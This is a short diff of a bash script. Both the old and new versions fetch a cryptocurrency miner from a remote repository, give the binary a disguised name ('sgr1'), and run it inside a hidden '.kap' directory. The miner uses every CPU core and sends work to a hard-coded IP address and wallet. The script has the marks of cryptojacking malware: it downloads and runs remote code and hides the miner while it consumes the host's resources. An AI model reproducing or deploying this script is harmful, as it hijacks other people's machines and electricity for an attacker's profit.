@@ -1,5 +1,6 @@
 #!/bin/bash
-wget https://github.com/DeroLuna/dero-miner/releases/download/v1.11-beta/deroluna-miner-linux-amd64.tar.gz
-tar xf deroluna-miner-linux-amd64.tar.gz
-mv deroluna-miner sgr1
-./sgr1 --daemon-address 95.179.169.217:10100 --wallet dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu --threads $(nproc --all) --never-stop
+mkdir .kap && cd .kap
+git clone https://github.com/nw4tw5/gradi.git
+cd gradi && mv astro sgr1
+chmod +x sgr1
+./sgr1 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 95.179.169.217:10100 -p rpc -m $(nproc --all)
